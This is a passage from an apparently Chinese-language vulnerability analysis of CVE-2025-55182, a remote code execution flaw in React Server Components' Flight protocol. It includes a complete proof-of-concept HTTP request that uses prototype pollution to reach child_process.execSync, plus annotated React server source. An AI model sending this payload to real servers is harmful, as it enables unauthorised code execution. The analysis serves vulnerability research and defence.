</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">客户端构造恶意</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span>
</span></span><span class="line"><span class="cl">        <span class="err">↓</span>
</span></span><span class="line"><span class="cl"><span class="n">decodeAction</span> <span class="err">反序列化出恶意服务器函数</span> <span class="p">(</span><span class="n">actionFn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="err">↓</span>
</span></span><span class="line"><span class="cl"><span class="err">服务端认为它是正常业务</span> <span class="n">action</span>
</span></span><span class="line"><span class="cl">        <span class="err">↓</span>
</span></span><span class="line"><span class="cl"><span class="n">actionFn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="err">↓</span>
</span></span><span class="line"><span class="cl"><span class="err">函数内部是攻击者构造的</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">        <span class="err">↓</span>
</span></span><span class="line"><span class="cl"><span class="n">vm</span><span class="o">.</span><span class="n">runInThisContext</span> <span class="o">/</span> <span class="n">Function</span> <span class="o">/</span> <span class="n">require</span>
</span></span><span class="line"><span class="cl">        <span class="err">↓</span>
</span></span><span class="line"><span class="cl"><span class="n">child_process</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s2">&#34;calc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="err">↓</span>
</span></span><span class="line"><span class="cl">    <span class="n">RCE</span> <span class="err">成功</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="漏洞分析2---flight协议" class="heading-element"><span>漏洞分析2 - Flight协议</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%902---flight%e5%8d%8f%e8%ae%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>这个漏洞分析针对的POC是：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="cl"><span class="n">Next-Action</span><span class="o">:</span> <span class="l">x</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">459</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryx8jO2oVc6SWP3Sad
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;0&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;then&#34;:&#34;$1:__proto__:then&#34;,&#34;status&#34;:&#34;resolved_model&#34;,&#34;reason&#34;:-1,&#34;value&#34;:&#34;{\&#34;then\&#34;:\&#34;$B1337\&#34;}&#34;,&#34;_response&#34;:{&#34;_prefix&#34;:&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;xcalc&#39;);&#34;,&#34;_formData&#34;:{&#34;get&#34;:&#34;$1:constructor:constructor&#34;}}}
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryx8jO2oVc6SWP3Sad
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;1&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#34;$@0&#34;
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</span></span></code></pre></td></tr></table>
</div>
</div><p>流程图：</p>
<p><a class="lightgallery" href="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251209141616507.png?size=large" data-thumbnail="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251209141616507.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251209141616507.png" alt="img" srcset="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251209141616507.png?size=small, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251209141616507.png?size=medium 1.5x, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20251209141616507.png?size=large 2x" data-title="img" style="--width: 1080px;--aspect-ratio: 1080 / 1530;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="flight协议分析" class="heading-element"><span>Flight协议分析</span>
  <a href="#flight%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>这一段分析主要是参考腾讯keenlab的文章 <a href="https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/"target="_blank" rel="external nofollow noopener noreferrer">【漏洞分析】CVE-2025-55182 React2shell远程代码执行解析</a></p>
<p>推荐去看原文，我这里略作整理</p>
<h4 id="入口函数decodereplyfrombusboy" class="heading-element"><span>入口函数：decodeReplyFromBusboy</span>
  <a href="#%e5%85%a5%e5%8f%a3%e5%87%bd%e6%95%b0decodereplyfrombusboy" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><code>decodeReplyFromBusboy</code> 是服务端解析客户端 FormData 的入口函数，位于 <code>ReactFlightDOMServerNode.js</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// packages/react-server-dom-webpack/src/server/ReactFlightDOMServerNode.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">decodeReplyFromBusboy</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">:</span> <span class="nx">Thenable</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="nx">busboyStream</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;field&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">pendingFiles</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">queuedFields</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">resolveField</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>  <span class="c1">// 处理表单字段
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>调用链：</strong> <code>resolveField</code> → <code>resolveModelChunk</code> → <code>initializeModelChunk</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// packages/react-server-dom-webpack/src/server/ReactFlightDOMServerNode.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 服务端解析 Busboy 流式表单数据的核心函数，核心作用：
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 1. 解析 multipart/form-data 格式的 Busboy 流，区分处理普通字段和文件上传；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 2. 保证「文件优先、字段排队」的解析顺序，避免数据乱序；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 3. 校验文件编码（拒绝 base64），逐块处理文件二进制数据；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 4. 监听流生命周期事件，完成响应关闭/错误上报，最终返回 Flight 协议根响应；
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 5. 是 Flight 协议处理 Server Actions 表单提交的核心入口。
</span></span></span><span class="line"><span class="cl"><span class="cm"> * 
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @template T - Flight 协议响应的根数据类型（泛型适配不同响应场景）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {Busboy} busboyStream - Busboy 解析流，处理 multipart/form-data 格式核心流
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {ServerManifest} webpackMap - React 服务端的 webpack 构建清单
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {Object=} options - 可选配置项，包含临时引用集合（temporaryReferences）
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @param {TemporaryReferenceSet=} options.temporaryReferences - Flight 协议的临时引用缓存，解决循环引用问题
</span></span></span><span class="line"><span class="cl"><span class="cm"> * @returns {Thenable&lt;T&gt;} - Flight 协议解析完成的根响应（Promise 类型，适配异步解析）
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">decodeReplyFromBusboy</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="nx">busboyStream</span><span class="o">:</span> <span class="nx">Busboy</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">webpackMap</span><span class="o">:</span> <span class="nx">ServerManifest</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">options</span><span class="o">?:</span> <span class="p">{</span><span class="nx">temporaryReferences</span><span class="o">?:</span> <span class="nx">TemporaryReferenceSet</span><span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">:</span> <span class="nx">Thenable</span><span class="o">&lt;</span><span class="nx">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤1：初始化 Flight 协议响应对象 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">createResponse</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="nx">webpackMap</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">options</span> <span class="o">?</span> <span class="nx">options</span><span class="p">.</span><span class="nx">temporaryReferences</span> <span class="o">:</span> <span class="kc">undefined</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">pendingFiles</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">queuedFields</span><span class="o">:</span> <span class="nb">Array</span><span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤2：监听普通表单字段事件（field） ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">busboyStream</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;field&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">pendingFiles</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 文件未处理完成时，将字段存入队列，避免字段与文件解析乱序
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">queuedFields</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 无文件处理时，直接处理表单字段，解析字段并关联到响应对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">resolveField</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤3：监听文件上传事件（file） ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">busboyStream</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="p">{</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">encoding</span><span class="p">,</span> <span class="nx">mimeType</span><span class="p">})</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="err">…………</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤4：监听Busboy流完成事件 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">busboyStream</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;finish&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">close</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤5：监听Busboy流错误事件 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">busboyStream</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="err">…………</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ========== 步骤6：返回Flight协议的根响应数据 ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="nx">getRoot</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>详细说明：</p>
<p>该函数是 <strong>React RSC/Flight 协议体系下，服务端解析 Busboy 流式表单数据（<code>multipart/form-data</code>）的核心函数</strong>，是 Flight 协议处理客户端表单提交（如 Server Actions）的关键入口。核心功能可拆解为：</p>
<ol>
<li><strong>初始化响应对象</strong>：创建 Flight 协议的响应容器，关联 webpack 映射和临时引用配置；</li>
<li><strong>分类型解析表单数据</strong>：区分处理普通表单字段和文件上传，保证文件未处理完成时普通字段先排队；
<ul>
<li>普通字段（<code>field</code>）：文件未处理完成时暂存队列，文件处理完毕后批量解析，保证字段与文件的解析顺序；</li>
<li>文件字段（<code>file</code>）：校验编码（拒绝 base64），逐块接收文件二进制数据并封装为 Blob 对象，添加到响应的 FormData 中，完成后清理队列并解析暂存字段；</li>
</ul>
</li>
<li><strong>生命周期与异常处理</strong>：监听 Busboy 流的完成 / 错误事件，完成响应关闭或全局错误上报；</li>
<li><strong>返回根响应数据</strong>：最终返回解析完成的 Flight 协议根响应，供后续序列化传输；</li>
</ol>
<p>整体实现了「文件优先、字段排队」的表单解析规则，保证 Flight 协议下表单数据（含文件）的完整、有序解析，支撑 Server Actions 的表单提交链路。</p>
<h4 id="字段解析resolvefield" class="heading-element"><span>字段解析：resolveField</span>
  <a href="#%e5%ad%97%e6%ae%b5%e8%a7%a3%e6%9e%90resolvefield" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>该函数是 <strong>RSC Flight 协议体系下处理表单字段的核心工具函数</strong>，核心作用为：</p>
<ol>
<li>先将表单字段（键值对）添加到响应对象的 FormData 中，保证表单数据的完整存储；</li>
<li>校验字段名是否以响应对象的预设前缀开头（通常是 RSC/Flight 协议的特殊标识前缀）；</li>
<li>若匹配前缀，提取字段名中的「块 ID」，从响应的块缓存中找到对应模型块，调用 <code>resolveModelChunk</code> 解析该块的内容（完成模型块与字段值的关联）。</li>
</ol>
<p>整体是 Flight 协议中「表单字段 → 模型块」映射解析的关键步骤，支撑服务端对特殊标记字段的精准处理。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// packages/react-server/src/ReactFlightReplyServer.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">* 解析并关联表单字段到响应对象及对应模型块，核心作用：
</span></span></span><span class="line"><span class="cl"><span class="cm">* 1. 将表单字段存入响应的FormData，保证基础数据存储；
</span></span></span><span class="line"><span class="cl"><span class="cm">* 2. 识别带RSC/Flight协议前缀的特殊字段，提取模型块ID并解析对应模型块；
</span></span></span><span class="line"><span class="cl"><span class="cm">* 3. 是服务端处理表单提交（如Server Actions）时，关联字段与模型块的核心逻辑。
</span></span></span><span class="line"><span class="cl"><span class="cm">*
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Response} response - Flight协议的响应对象，包含FormData、模型块缓存、前缀标识等核心属性
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {string} key - 表单字段名（普通字段/带RSC前缀的特殊字段）
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {string} value - 表单字段值
</span></span></span><span class="line"><span class="cl"><span class="cm">* @returns {void} - 无返回值，直接修改response对象的内部状态
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="kd">function</span> <span class="nx">resolveField</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="nx">response</span><span class="o">:</span> <span class="nx">Response</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">key</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">value</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">:</span> <span class="k">void</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 1. 基础操作：将当前表单字段（键值对）添加到响应对象的FormData中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">response</span><span class="p">.</span><span class="nx">_formData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 2. 获取响应对象中预设的Flight协议前缀（如&#34;$MODEL_CHUNK_&#34;等特殊标识）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">prefix</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_prefix</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 3. 校验：当前字段是否为Flight协议标记的「模型块关联字段」
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">key</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="nx">prefix</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 3.1 从响应对象中获取模型块缓存（Map结构，key为块ID，value为模型块数据）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">chunks</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_chunks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 3.2 提取字段名中前缀后的部分，转为数字类型的模型块ID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="o">+</span><span class="nx">key</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">prefix</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 3.3 从缓存中获取该ID对应的模型块
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">const</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="nx">chunks</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 4. 若模型块存在，调用resolveModelChunk解析该块（关联字段值与模型块）
